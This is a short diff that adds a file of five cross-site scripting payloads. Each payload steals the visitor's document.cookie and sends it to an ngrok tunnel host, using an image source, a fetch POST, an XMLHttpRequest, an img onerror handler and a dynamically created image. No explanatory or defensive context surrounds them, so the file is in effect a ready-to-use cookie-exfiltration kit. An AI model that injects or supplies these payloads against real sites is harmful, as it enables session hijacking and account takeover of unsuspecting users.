@@ -1,0 +1,26 @@
+<script>new Image().src="https://126c-196-1-1-6.ngrok-free.app/cookie.php?cookie="+document.cookie</script>
+
+<script>
+fetch('https://126c-196-1-1-6.ngrok-free.app', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", "https://126c-196-1-1-6.ngrok-free.app" + document.cookie, true);
+  xhr.send();
+</script>
+
+
+<img src=x onerror=this.src='https://126c-196-1-1-6.ngrok-free.app/?c='+document.cookie>
+
+
+
+<script>
+var img = document.createElement("img"); 
+img.src="https://126c-196-1-1-6.ngrok-free.app" + "/cookie=" + encodeURIComponent(document.cookie);
+document.body.appendChild(img);
+</script>
